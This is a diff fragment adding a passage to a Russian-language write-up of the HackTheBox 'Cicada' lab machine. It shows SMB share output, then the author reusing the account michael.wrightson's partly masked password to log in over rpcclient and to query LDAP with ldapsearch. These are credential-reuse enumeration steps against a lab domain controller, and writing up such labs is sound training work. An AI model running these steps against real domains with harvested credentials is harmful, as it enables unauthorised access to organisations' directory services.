@@ -301,4 +301,17 @@ SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ        
 SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
 ```
 
+Мы можем вработать через эту учетную запись не только в **SMB**, давайте попробуем войти через неё в **RPC** и **LDAP**
+
+
+```vbnet
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ rpcclient -U michael.wrightson cicada.htb                                                                                       1 ↵ main 
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Password for [WORKGROUP\michael.wrightson]:
+rpcclient $>
+```
+
+```vbnet
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*****' -b 'dc=cicada,dc=htb'
+```
 
